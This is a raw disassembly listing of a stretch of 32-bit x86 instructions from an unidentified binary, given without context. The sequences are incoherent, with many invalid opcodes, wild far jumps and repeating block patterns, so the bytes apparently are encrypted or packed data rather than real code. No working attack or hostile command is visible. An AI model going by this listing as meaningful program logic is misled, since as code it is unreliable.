  425547:	xor    eax,0x53444e53
  42554c:	pop    ds
  42554d:	mov    eax,0x36968e30
  425552:	adc    DWORD PTR [edi+0x63],eax
  425555:	cmp    al,0x2b
  425557:	shl    BYTE PTR [esi],1
  425559:	inc    ebx
  42555a:	push   edi
  42555b:	and    eax,0x1b01acf8
  425560:	leave  
  425561:	push   ebx
  425562:	mov    es,WORD PTR [ebp-0x124bfa1d]
  425568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425569:	lahf   
  42556a:	xor    esi,eax
  42556c:	les    esi,FWORD PTR [edi-0xecea9bf]
  425572:	ss sahf 
  425574:	pop    ds
  425575:	jbe    0x425546
  425577:	icebp  
  425578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425579:	clc    
  42557a:	gs cld 
  42557c:	retf   0xb08b
  42557f:	mov    ebp,DWORD PTR [edi+0x7f]
  425582:	int    0x72
  425584:	jmp    0x4255c0
  425586:	das    
  425587:	mov    esp,edi
  425589:	mov    ebx,0x710e2977
  42558e:	xchg   ebp,eax
  42558f:	div    BYTE PTR [ebp-0x420b24b8]
  425595:	ss xor eax,0xb0a3a244
  42559b:	clc    
  42559c:	xchg   edx,eax
  42559d:	add    esp,DWORD PTR [edx+0x71]
  4255a0:	pop    ss
  4255a1:	ss retf 
  4255a3:	outs   dx,DWORD PTR gs:[esi]
  4255a5:	std    
  4255a6:	sbb    al,0x5e
  4255a8:	dec    edx
  4255a9:	addr16 jns 0x4255d7
  4255ac:	mov    eax,ds:0x33ee8ea2
  4255b1:	mov    bl,BYTE PTR [ecx]
  4255b3:	sbb    esp,esi
  4255b5:	inc    edx
  4255b6:	mov    eax,esp
  4255b8:	aaa    
  4255b9:	jb     0x4255e3
  4255bb:	mov    ebp,0x385ff73d
  4255c0:	push   edi
  4255c1:	sbb    ecx,DWORD PTR [esi+ecx*2+0xf3a204a]
  4255c8:	sub    edx,DWORD PTR [edi-0x51873adf]
  4255ce:	dec    edx
  4255cf:	cmp    BYTE PTR [ecx],cl
  4255d1:	fwait
  4255d2:	retf   0x675d
  4255d5:	mov    edi,0x8e46902
  4255da:	mov    bh,0xa9
  4255dc:	or     DWORD PTR [esi],ebp
  4255de:	push   0x6b0c3d81
  4255e3:	inc    edi
  4255e4:	fadd   QWORD PTR [ebx]
  4255e6:	aas    
  4255e7:	hlt    
  4255e8:	or     BYTE PTR [edx-0xa9037e8],al
	...
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0x4ed9f13a
  425664:	fldcw  WORD PTR [esi+0x67]
  425667:	xchg   ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	cli    
  42566f:	dec    esp
  425670:	mov    eax,ds:0x3af3ed35
  425675:	in     al,0xda
  425677:	mov    edx,0x8eb71a4f
  42567c:	add    BYTE PTR [esi-0x50febc9e],0xfe
  425683:	ds xchg esi,eax
  425685:	xchg   ebx,eax
  425686:	in     al,dx
  425687:	pop    edx
  425688:	(bad)  
  425689:	or     edx,esi
  42568b:	pop    ds
  42568c:	(bad)  
  42568d:	dec    edx
  42568e:	bound  esi,QWORD PTR [eax-0x5f]
  425691:	mov    bl,0x61
  425693:	sbb    edi,esp
  425695:	mov    esp,0xe24aeb46
  42569a:	adc    eax,0xaff8c88c
  42569f:	or     esp,eax
  4256a1:	lods   al,BYTE PTR ds:[esi]
  4256a2:	xor    eax,0x74dd7018
  4256a7:	data16 into 
  4256a9:	leave  
  4256aa:	int3   
  4256ab:	addr16 leave 
  4256ad:	and    eax,0x776f0d8e
  4256b2:	xchg   edi,eax
  4256b3:	rcr    DWORD PTR [eax+eiz*1],cl
  4256b6:	retf   
  4256b7:	push   edx
  4256b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256ba:	push   edi
  4256bb:	outs   dx,BYTE PTR ds:[esi]
  4256bc:	shr    DWORD PTR [ebp+0x56994772],0xa0
  4256c3:	leave  
  4256c4:	sti    
  4256c5:	push   esp
  4256c6:	mov    ah,0x48
  4256c8:	sti    
  4256c9:	push   esi
  4256ca:	jmp    0x425657
  4256cc:	shl    BYTE PTR [ebp+edx*4-0x4f1edf5f],1
  4256d3:	mov    BYTE PTR [esi-0x7d4d36d9],dl
  4256d9:	scas   eax,DWORD PTR es:[edi]
  4256da:	xchg   ebx,eax
  4256db:	iret   
  4256dc:	shl    BYTE PTR [ebx-0x15],0x75
  4256e0:	push   esp
  4256e1:	loop   0x42566a
  4256e3:	jg     0x425712
  4256e5:	in     al,0xb6
  4256e7:	or     BYTE PTR [edx-0x4a],dl
  4256ea:	xchg   edx,eax
  4256eb:	gs cmp eax,0x23e668b6
  4256f1:	add    eax,0xd6c1f098
  4256f6:	popa   
  4256f7:	push   esp
  4256f8:	mov    dh,0x8f
  4256fa:	fnstcw WORD PTR [eax-0x23]
  4256fd:	mov    edi,0x7d62a9ee
  425702:	rcr    DWORD PTR [eax-0x52],cl
  425705:	cli    
  425706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425707:	push   ds
  425708:	mov    ds:0x29e98e68,eax
  42570d:	aas    
  42570e:	dec    ebp
  42570f:	outs   dx,DWORD PTR ds:[esi]
  425710:	das    
  425711:	add    DWORD PTR [eax+edi*4-0x195f888c],esi
  425718:	stos   BYTE PTR es:[edi],al
  425719:	ror    BYTE PTR [eax+0x5c],1
  42571c:	mov    al,ds:0xf06671f9
  425721:	hlt    
  425722:	shl    BYTE PTR [edi-0x4d3e909],1
  425728:	iret   
  425729:	push   esi
  42572a:	mov    bl,0xd0
  42572c:	test   BYTE PTR [edx-0x42b589d9],al
  425732:	adc    al,ah
  425734:	mov    dl,0xdd
  425736:	jae    0x4257ac
  425738:	lea    ecx,[edx-0x48]
  42573b:	inc    eax
  42573c:	dec    ecx
  42573d:	dec    edi
  42573e:	outs   dx,DWORD PTR ds:[esi]
  42573f:	cmp    eax,0x1f058da2
  425744:	cmp    BYTE PTR [esi+0x5d],al
  425747:	or     eax,0xe5973e51
  42574c:	in     al,0xcd
  42574e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42574f:	cli    
  425750:	add    DWORD PTR [edi+0x4b53f1de],esp
  425756:	inc    ebp
  425757:	iret   
  425758:	jno    0x4257a7
  42575a:	inc    edx
  42575b:	xlat   BYTE PTR ds:[ebx]
  42575c:	stc    
  42575d:	mov    ecx,0x38bdfd5d
  425762:	mov    eax,ds:0xaa5436bd
  425767:	test   DWORD PTR [eax],0xa18f34c0
  42576d:	lods   al,BYTE PTR ds:[esi]
	...
  4257d6:	(bad)  
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0x505d0674
  4257e5:	aas    
  4257e6:	addr16 xchg edx,eax
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	mov    cl,0xf0
  4257f0:	push   ds
  4257f1:	pop    edi
  4257f2:	jge    0x4257a5
  4257f4:	dec    ecx
  4257f5:	xchg   dh,al
  4257f7:	lods   al,BYTE PTR ds:[esi]
  4257f8:	jmp    0x4257c3
  4257fa:	xor    BYTE PTR [esi-0x4dc2c185],0x8
  425801:	dec    DWORD PTR ds:0x27b4ded9
  425807:	ins    DWORD PTR es:[edi],dx
  425808:	test   al,0x33
  42580a:	jecxz  0x425806
  42580c:	xor    ah,BYTE PTR [esi]
  42580e:	mov    esp,DWORD PTR [ecx-0x60]
  425811:	pop    edx
  425812:	rcr    BYTE PTR [edi],1
  425814:	add    DWORD PTR [edi-0xf81d45],edx
  42581a:	clc    
  42581b:	imul   esi,DWORD PTR ds:0xa89887b3,0x2769db2f
  425825:	jmp    0x6497:0x7a81763d
  42582c:	pop    ecx
  42582d:	retf   0x23bc
  425830:	jae    0x4258ab
  425832:	mov    WORD PTR [edi],es
  425834:	sbb    al,BYTE PTR [esi]
  425836:	in     eax,dx
  425837:	or     BYTE PTR [ebp-0x32],0x8b
  42583b:	jns    0x4257cf
  42583d:	aad    0xf7
  42583f:	aas    
  425840:	mov    al,0x9f
  425842:	lods   eax,DWORD PTR ds:[esi]
  425843:	push   edi
  425844:	(bad)  
  425845:	jns    0x425884
  425847:	stc    
  425848:	cwde   
  425849:	das    
  42584a:	scas   eax,DWORD PTR es:[edi]
  42584b:	stos   DWORD PTR es:[edi],eax
  42584c:	(bad)  
  42584d:	lods   eax,DWORD PTR ds:[esi]
  42584e:	cmp    DWORD PTR [edx+0x9166812],eax
  425854:	inc    eax
  425855:	rcl    BYTE PTR [esi],cl
  425857:	push   ebx
  425858:	(bad)  
  425859:	sbb    bl,BYTE PTR [esi]
  42585b:	neg    bl
  42585d:	nop
  42585e:	inc    ebp
  42585f:	adc    edx,DWORD PTR [ebx-0x2f57a7d5]
  425865:	pop    edx
  425866:	sub    dh,BYTE PTR [edi]
  425868:	add    eax,0xad05672d
  42586d:	and    BYTE PTR [esi-0x52],dh
  425870:	and    eax,0xcf0299e
  425875:	jecxz  0x4257fa
  425877:	fwait
  425878:	in     al,dx
  425879:	sar    DWORD PTR [ebp+0x17],1
  42587c:	imul   ebp,DWORD PTR [eax],0x89d0ffe5
  425882:	loopne 0x42586c
  425884:	pop    ebx
  425885:	outs   dx,DWORD PTR ds:[esi]
  425886:	inc    esp
  425887:	cmp    eax,0x729037cf
  42588c:	sbb    edx,DWORD PTR ds:0x74a2bcc7
  425892:	mov    ?,WORD PTR [edi-0x75cc19cf]
  425898:	outs   dx,BYTE PTR ds:[esi]
  425899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42589a:	mov    esp,DWORD PTR [ebp-0x65271d86]
  4258a0:	test   eax,0xfa2dc361
  4258a5:	xchg   ebx,eax
  4258a6:	mov    dl,0x30
  4258a8:	push   ecx
  4258a9:	add    eax,DWORD PTR [ebx-0x5c]
  4258ac:	jmp    0x49bfd60
  4258b1:	xor    esi,DWORD PTR [ebx-0x31c7cba0]
  4258b7:	xchg   ebp,eax
  4258b8:	xchg   edi,eax
  4258b9:	(bad)
  4258bc:	dec    esi
  4258bd:	push   esp
  4258be:	fcom   st(3)
  4258c0:	push   edx
  4258c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258c2:	sbb    ah,BYTE PTR [edi*2+0x2d8e50b1]
  4258c9:	ret    
  4258ca:	push   ss
  4258cb:	cwde   
  4258cc:	ja     0x425876
  4258ce:	jp     0x425948
  4258d0:	bound  edi,QWORD PTR [ebx]
  4258d2:	cmp    BYTE PTR [esi+0x4bce8478],dl
  4258d8:	dec    edx
  4258d9:	fiadd  WORD PTR [eax]
  4258db:	retf   0xf43c
  4258de:	xor    esp,DWORD PTR [ebp-0x48e2ad35]
  4258e4:	mov    dl,0x9c
  4258e6:	xor    BYTE PTR [ebx+0x23b476b0],0x87
  4258ed:	js     0x4258ef
	...
  425953:	add    BYTE PTR [eax],al
  425955:	add    BYTE PTR [edx+edx*2-0x70],bl
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	bound  edi,QWORD PTR [edx-0xe]
  425965:	pop    es
  425966:	addr16 xchg ebx,eax
  425968:	add    DWORD PTR [eax],eax
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	push   es
  42596f:	pop    esi
  425970:	call   0xfcea6eb3
  425975:	jnp    0x4259c8
  425977:	mov    dl,0x62
  425979:	add    edx,DWORD PTR [eax+0x35]
  42597c:	cmp    al,0x44
  42597e:	aad    0xd0
  425980:	in     eax,dx
  425981:	add    DWORD PTR [ebp-0x41209ba5],ebp
  425987:	mov    esi,0x8d073b04
  42598c:	call   0x7ca4:0xb1f8b772
  425993:	aad    0xcf
  425995:	sub    ecx,edx
  425997:	xlat   BYTE PTR ds:[ebx]
  425998:	das    
  425999:	int    0xdf
  42599b:	or     bl,BYTE PTR [eax+0x24f5ddfb]
  4259a1:	dec    eax
  4259a2:	(bad)  
  4259a3:	jmp    edi
  4259a5:	mov    esp,0x49fd5283
  4259aa:	pop    esi
  4259ab:	dec    ecx
  4259ac:	sub    eax,eax
  4259ae:	(bad)  
  4259af:	(bad)  
  4259b1:	jg     0x42596c
  4259b3:	xchg   ebp,eax
  4259b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259b5:	test   eax,0x76425f80
  4259ba:	ror    BYTE PTR [edi],cl
  4259bc:	gs out dx,eax
  4259be:	mov    eax,ds:0x3b7062ba
  4259c3:	inc    ecx
  4259c4:	cmp    edi,DWORD PTR [ebx+eiz*2-0x29]
  4259c8:	or     DWORD PTR [edx+0x521256fa],ebp
  4259ce:	mov    ds:0x7084f2e,eax
  4259d3:	lods   al,BYTE PTR ds:[esi]
  4259d4:	cmc    
  4259d5:	icebp  
  4259d6:	loope  0x425975
  4259d8:	jmp    0x92d1:0x15f7e32f
  4259df:	dec    eax
  4259e0:	mov    ds:0x6589f06f,eax
  4259e5:	mov    esp,0x12c514c7
  4259ea:	inc    ebx
  4259eb:	pop    ecx
  4259ec:	addr16 xchg edi,eax
  4259ee:	(bad)  
  4259ef:	mov    BYTE PTR [ecx-0x70],bl
  4259f2:	cmc    
  4259f3:	popa   
  4259f4:	dec    esp
  4259f5:	hlt    
  4259f6:	xchg   edi,eax
  4259f7:	xor    cl,bl
  4259f9:	add    ebp,ebp
  4259fb:	leavew 
  4259fd:	inc    ebp
  4259fe:	fisttp QWORD PTR ds:0xcac3ea67
  425a04:	sbb    DWORD PTR [edx],edi
  425a06:	ret    
  425a07:	stc    
  425a08:	imul   esi,DWORD PTR [esp+edi*4],0xffffffb4
  425a0c:	ficomp WORD PTR [ecx+edx*1+0x63ee1ffc]
  425a13:	pop    ebp
  425a14:	dec    esp
  425a15:	ins    BYTE PTR es:[edi],dx
  425a16:	jnp    0x425a8d
  425a18:	jne    0x425a3e
  425a1a:	pushf  
  425a1b:	int3   
  425a1c:	popf   
  425a1d:	push   esp
  425a1e:	push   cs
  425a1f:	dec    edi
  425a20:	das    
  425a21:	adc    esp,DWORD PTR [edi-0x15585cbe]
  425a27:	sbb    BYTE PTR [esi-0x1d],0x3b
  425a2b:	push   ss
  425a2c:	pop    ebp
  425a2d:	jl     0x425a05
  425a2f:	stos   DWORD PTR es:[edi],eax
  425a30:	jp     0x425aa0
  425a32:	retf   0xd007
  425a35:	push   ds
  425a36:	pop    ss
  425a37:	jecxz  0x425a75
  425a39:	aad    0x1b
  425a3b:	sbb    DWORD PTR [edx],eax
  425a3d:	in     eax,dx
  425a3e:	dec    edx
  425a3f:	test   DWORD PTR [ecx],ecx
  425a41:	push   ebx
  425a42:	xor    edi,edx
  425a44:	gs dec edx
  425a46:	jo     0x4259cd
  425a48:	(bad)  
  425a49:	aad    0x33
  425a4b:	cmp    eax,0xcaa44c3a
  425a50:	fsub   QWORD PTR [ebx]
  425a52:	jnp    0x425a56
  425a54:	in     eax,0x31
  425a56:	das    
  425a57:	xor    eax,0x5eb179cd
  425a5c:	inc    eax
  425a5d:	pop    esi
  425a5e:	add    bl,BYTE PTR ds:0xcd064db6
  425a64:	enter  0xc42e,0xc6
  425a68:	xor    BYTE PTR [edi],0xf2
  425a6b:	jno    0x425a41
  425a6d:	cmp    al,0x0
	...
  425ad3:	add    BYTE PTR [eax],al
  425ad5:	add    cl,al
  425ad7:	arpl   WORD PTR [edi+eiz*2],ax
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4+0x7f30a833]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	fsubr  st(7),st
  425af0:	js     0x425b54
  425af2:	imul   ebp,DWORD PTR [ecx+ebp*4],0xf
  425af6:	cmp    BYTE PTR [edx],dl
  425af8:	rcl    DWORD PTR [edi],cl
  425afa:	scas   al,BYTE PTR es:[edi]
  425afb:	jle    0x425aab
  425afd:	sub    edx,eax
  425aff:	pop    eax
  425b00:	aaa    
  425b01:	push   esp
  425b02:	sbb    al,BYTE PTR [ebx+eax*2-0x39d338c0]
  425b09:	rep lods eax,DWORD PTR ds:[esi]
  425b0b:	cmp    edi,esp
  425b0d:	jmp    0x70991274
  425b12:	test   al,0xba
  425b14:	or     eax,0xcdef3b90
  425b19:	mov    DWORD PTR [esi-0x68],edx
  425b1c:	ret    
  425b1d:	jge    0x425b6d
  425b1f:	(bad)  
  425b20:	dec    ebp
  425b21:	cwde   
  425b22:	stc    
  425b23:	adc    dh,bl
  425b25:	out    0x71,al
  425b27:	rcr    DWORD PTR [edx],0xa7
  425b2a:	or     al,0x52
  425b2c:	jne    0x425b73
  425b2e:	mov    edx,0x9006ecca
  425b33:	and    DWORD PTR [eax+0x2160d5a6],0x3a5b5f9f
  425b3d:	jg     0x425b91
  425b3f:	inc    ebp
  425b40:	mov    esi,0xc1245890
  425b45:	daa    
  425b46:	xor    DWORD PTR [edi-0x7a],0xffffffcd
  425b4a:	imul   esp,DWORD PTR [esi+0x3722e953],0xbd02447f
  425b54:	mov    dl,0xf
  425b56:	sub    ecx,DWORD PTR [ecx]
  425b58:	(bad)  
  425b59:	dec    DWORD PTR [edi+ebx*1+0xd]
  425b5d:	lds    esp,FWORD PTR [edx-0x6e]
  425b60:	inc    ebx
  425b61:	dec    esp
  425b62:	inc    edx
  425b63:	ficomp DWORD PTR [esi+0x6e]
  425b66:	retf   
  425b67:	mov    ebp,0x29b87a41
  425b6c:	stc    
  425b6d:	or     BYTE PTR [edi-0x330543a7],0xef
  425b74:	retf   0x3879
  425b77:	jbe    0x425bcd
  425b79:	lea    edi,[eax+edx*1+0x79c30b3b]
  425b80:	add    DWORD PTR [edi],0x978845f1
  425b86:	bound  ebx,QWORD PTR [eax]
  425b88:	jg     0x425bd8
  425b8a:	inc    esi
  425b8b:	xor    cl,BYTE PTR [edx+0x2ab51526]
  425b91:	arpl   WORD PTR [edi-0x3483cd89],sp
  425b97:	pop    esi
  425b98:	sbb    esp,ecx
  425b9a:	or     al,0xdb
  425b9c:	out    0x99,eax
  425b9e:	or     eax,0x7bf1fe06
  425ba3:	ja     0x425b67
  425ba5:	or     al,0x95
  425ba7:	lea    ebx,[edx]
  425ba9:	(bad)  
  425baa:	sahf   
  425bab:	cdq    
  425bac:	xchg   ebx,eax
  425bad:	mov    dh,0x43
  425baf:	mov    ds:0x1d83f063,al
  425bb4:	cmp    al,0x77
  425bb6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  425bb8:	and    ecx,eax
  425bba:	imul   ebx,DWORD PTR [edi+0x1b],0x45
  425bbe:	mov    dh,0x42
  425bc0:	push   es
  425bc1:	ja     0x425bca
  425bc3:	adc    al,0x40
  425bc5:	dec    esi
  425bc6:	pop    esi
  425bc7:	pusha  
  425bc8:	add    DWORD PTR [ecx+eiz*8-0xb062612],ecx
  425bcf:	lods   al,BYTE PTR ds:[esi]
  425bd0:	dec    ecx
  425bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bd2:	shl    DWORD PTR [edx],0x19
  425bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425bd6:	xchg   esp,eax
  425bd7:	dec    esi
  425bd8:	push   eax
  425bd9:	inc    esp
  425bda:	fs cmp bh,0xa6
  425bde:	add    al,0xf1
  425be0:	je     0x425bb4
  425be2:	cmp    al,0xf7
  425be4:	std    
  425be5:	or     al,0xa4
  425be7:	rcl    BYTE PTR [edi-0x7115f28f],cl
  425bed:	push   eax
	...
  425c56:	(bad)  
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	loope  0x425c5b
  425c64:	or     ebp,edi
  425c66:	addr16 xchg ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	add    BYTE PTR [ecx-0x810cbb],ah
  425c74:	lds    eax,FWORD PTR [edx+eax*2-0x76]
  425c78:	sahf   
  425c79:	aaa    
  425c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c7b:	stos   BYTE PTR es:[edi],al
  425c7c:	add    al,0x14
  425c7e:	pop    edx
  425c7f:	pop    es
  425c80:	ds cwde 
  425c82:	imul   esp,ecx,0x1d547ed6
  425c88:	cwde   
  425c89:	jnp    0x425c91
  425c8b:	fcomp  DWORD PTR [eax]
  425c8d:	lods   eax,DWORD PTR ds:[esi]
  425c8e:	call   0x4b23:0xffb3fd48
  425c95:	hlt    
  425c96:	and    dh,cl
  425c98:	outs   dx,BYTE PTR ds:[esi]
  425c99:	inc    eax
  425c9a:	xchg   esi,eax
  425c9b:	jne    0x425c5e
  425c9d:	mov    ah,0xfd
  425c9f:	enter  0x4537,0x69
  425ca3:	imul   eax,DWORD PTR [ebx-0x33dfdc35],0xf511802c
  425cad:	and    eax,0x41938e6d
  425cb2:	fdiv   QWORD PTR [ebx-0x4f]
  425cb5:	jg     0x425c44
  425cb7:	jno    0x425ca0
  425cb9:	lahf   
  425cba:	loope  0x425c84
  425cbc:	add    al,0xbb
  425cbe:	sub    edx,esp
  425cc0:	cmovns edi,DWORD PTR [edx+0x331922e4]
  425cc7:	and    eax,0xd04de045
  425ccc:	popa   
  425ccd:	xchg   ebx,eax
  425cce:	idiv   BYTE PTR [ebp-0x1c4e487d]
  425cd4:	xchg   BYTE PTR [esi-0x1d],cl
  425cd7:	xlat   BYTE PTR ds:[ebx]
  425cd8:	dec    esi
  425cd9:	stos   BYTE PTR es:[edi],al
  425cda:	add    esp,DWORD PTR [esi-0x8abccd6]
  425ce0:	dec    esi
  425ce1:	shl    DWORD PTR [edi+0x3afebba8],0x0
  425ce8:	inc    esp
  425ce9:	cli    
  425cea:	(bad)  
  425ceb:	in     eax,dx
  425cec:	aad    0x26
  425cee:	cmc    
  425cef:	fnstcw WORD PTR [edx+eax*4+0x54fcf3f5]
  425cf6:	es xor eax,0xda024fca
  425cfc:	or     edx,edx
  425cfe:	cmc    
  425cff:	out    dx,eax
  425d00:	dec    esp
  425d01:	nop
  425d02:	and    dh,BYTE PTR [esi]
  425d04:	xor    esi,DWORD PTR [ecx]
  425d06:	mov    ds:0x557064b0,eax
  425d0b:	shl    DWORD PTR [esi+ecx*2+0x503b5569],0xe
  425d13:	cwde   
  425d14:	(bad)  
  425d15:	pop    esp
  425d16:	adc    al,0x70
  425d18:	aad    0x35
  425d1a:	jne    0x425d09
  425d1c:	cmp    al,0xf3
  425d1e:	mov    dh,0x75
  425d20:	imul   esi,ebx,0xd93cb0b3
  425d26:	das    
  425d27:	push   cs
  425d28:	mov    ah,0xbe
  425d2a:	inc    ebp
  425d2b:	mov    dh,0xc4
  425d2d:	push   esi
  425d2e:	and    al,0xbb
  425d30:	das    
  425d31:	adc    DWORD PTR [eax],ebx
  425d33:	inc    ebx
  425d34:	mov    BYTE PTR [ecx+0x52],dh
  425d37:	rcr    BYTE PTR [edx-0x58],cl
  425d3a:	sbb    al,0x4d
  425d3c:	xor    BYTE PTR [edi-0x4d],ch
  425d3f:	jmp    0x3bac:0xa02767f3
  425d46:	mov    bh,0x6b
  425d48:	out    dx,eax
  425d49:	loopne 0x425d22
  425d4b:	test   al,0xfd
  425d4d:	out    dx,al
  425d4e:	sub    ch,BYTE PTR [edx+eiz*8+0x6c78b9d9]
  425d55:	adc    eax,0x2630f541
  425d5a:	and    al,0x1
  425d5c:	ins    BYTE PTR es:[edi],dx
  425d5d:	shr    dl,cl
  425d5f:	mov    al,ds:0x4e8c8273
  425d64:	inc    edx
  425d65:	(bad)  
  425d66:	push   edi
  425d67:	mov    esp,ebp
  425d69:	xchg   ebp,eax
  425d6a:	mov    dl,0x2c
  425d6c:	xor    eax,0x9d
	...
  425dd5:	add    bh,bh
  425dd7:	lods   al,BYTE PTR ds:[esi]
  425dd8:	fadd   QWORD PTR [edi]
  425dda:	fbstp  TBYTE PTR [edi-0x1]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x3feff9fb,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	dec    ebp
  425def:	push   edx
  425df0:	cli    
  425df1:	adc    ecx,DWORD PTR [edx-0x52002dfb]
  425df7:	mov    ah,ch
  425df9:	cmp    DWORD PTR [eax+0x66e7ddce],edx
  425dff:	in     al,0x6
  425e01:	mov    ebp,edi
  425e03:	hlt    
  425e04:	adc    al,0x96
  425e06:	ss leave 
  425e08:	xchg   ebp,eax
  425e09:	fwait
  425e0a:	or     bh,cl
  425e0c:	mov    WORD PTR [ecx+esi*1-0x63],ds
  425e10:	inc    ebp
  425e11:	pop    ecx
  425e12:	pop    ebx
  425e13:	ficomp WORD PTR [edi+0x36e12e95]
  425e19:	pop    ecx
  425e1a:	jmp    DWORD PTR [ebx]
  425e1c:	fsubp  st(6),st
  425e1e:	ret    0x1fb6
  425e21:	pop    esi
  425e22:	outs   dx,BYTE PTR ds:[esi]
  425e23:	clc    
  425e24:	fidiv  WORD PTR ds:0xd29fa8d6
  425e2a:	iret   
  425e2b:	inc    eax
  425e2c:	jb     0x425dd6
  425e2e:	(bad)  
  425e2f:	stos   BYTE PTR es:[edi],al
  425e30:	fnstcw WORD PTR ds:0x3a70f690
  425e36:	mov    ebp,0x781eee96
  425e3b:	iret   
  425e3c:	push   ss
  425e3d:	or     esp,DWORD PTR [ecx]
  425e3f:	jns    0x425e27
  425e41:	dec    edi
  425e42:	inc    eax
  425e43:	adc    DWORD PTR [ebx],esp
  425e45:	dec    ebp
  425e46:	push   cs
  425e47:	aas    
  425e48:	push   cs
  425e49:	jnp    0x425ec8
  425e4b:	cmp    edx,DWORD PTR [eax-0x152df530]
  425e51:	jae    0x425dfa
  425e53:	sub    edx,ebx
  425e55:	fs push ss
  425e57:	dec    eax
  425e58:	mov    ebp,0xc17ba3dc
  425e5d:	(bad)  
  425e5e:	jle    0x425dfe
  425e60:	mov    eax,ds:0xfeb7b15b
  425e65:	jmp    0xaaef:0xfdbc4ab1
  425e6c:	sti    
  425e6d:	jae    0x425e28
  425e6f:	int    0x80
  425e71:	rcl    DWORD PTR [esi+0x6a],1
  425e74:	call   0x4116:0xb61a2108
  425e7b:	mov    cs,WORD PTR [edx+ecx*2+0x7a76865c]
  425e82:	dec    ebx
  425e83:	imul   ebp,DWORD PTR [edx],0x7234ec93
  425e89:	cmp    BYTE PTR [edi+0x1],bh
  425e8c:	fld    QWORD PTR [edi]
  425e8e:	mov    ebx,0x81c3add0
  425e93:	int3   
  425e94:	pop    eax
  425e95:	repnz mov ds:0x57d9ad68,al
  425e9b:	jne    0x425e6e
  425e9d:	or     BYTE PTR [ebx+0x5d333e3b],ah
  425ea3:	pop    ss
  425ea4:	pusha  
  425ea5:	push   ebp
  425ea6:	adc    bl,ah
  425ea8:	ins    DWORD PTR es:[edi],dx
  425ea9:	cmp    ch,cl
  425eab:	pushf  
  425eac:	push   ebp
  425ead:	pop    esp
  425eae:	mov    bh,0xa4
  425eb0:	sar    BYTE PTR [eax],1
  425eb2:	inc    ecx
  425eb3:	dec    ecx
  425eb4:	cmp    DWORD PTR [ebx],ecx
  425eb6:	(bad)  
  425eb7:	fsub   QWORD PTR [esi]
  425eb9:	mov    ecx,DWORD PTR [ecx+0x748ec66f]
  425ebf:	scas   al,BYTE PTR es:[edi]
  425ec0:	test   BYTE PTR [esi-0x46],bh
  425ec3:	ret    0x824f
  425ec6:	rcr    edi,0x0
  425ec9:	pop    es
  425eca:	(bad)  
  425ecb:	mov    BYTE PTR [edi+0x50],bl
  425ece:	fstp   TBYTE PTR [esi]
  425ed1:	cmp    ebp,DWORD PTR [ecx+0x602e6c34]
  425ed7:	in     al,dx
  425ed8:	and    ebp,DWORD PTR [ecx]
  425eda:	dec    eax
  425edb:	stos   BYTE PTR es:[edi],al
  425edc:	leave  
  425edd:	jmp    0xcccb:0xec678325
  425ee4:	push   ebp
  425ee5:	lahf   
  425ee6:	jbe    0x425e85
  425ee8:	test   BYTE PTR ds:0xb00c733d,dl
	...
  425f56:	(bad)  
  425f57:	jl     0x425faa
  425f59:	sar    bl,1
  425f5b:	std    
  425f5c:	(bad)  
  425f5d:	jle    0x425f2b
  425f5f:	pop    ss
  425f60:	popf   
  425f61:	scas   eax,DWORD PTR es:[edi]
  425f62:	xchg   esp,eax
  425f63:	sbb    eax,0x9767a5be
  425f68:	add    DWORD PTR [eax],eax
  425f6a:	add    BYTE PTR [ecx],al
  425f6c:	add    BYTE PTR [eax],al
  425f6e:	loope  0x425f90
  425f70:	dec    esi
  425f71:	inc    esp
  425f72:	stos   DWORD PTR es:[edi],eax
  425f73:	dec    edx
  425f74:	sub    DWORD PTR [edi-0x2a],eax
  425f77:	push   eax
  425f78:	push   cs
  425f79:	loope  0x425fd9
  425f7b:	das    
  425f7c:	shl    DWORD PTR [ecx+edi*4],1
  425f7f:	mov    ecx,0x2e4a7b00
  425f84:	fldcw  WORD PTR [esi]
  425f86:	rcr    edx,1
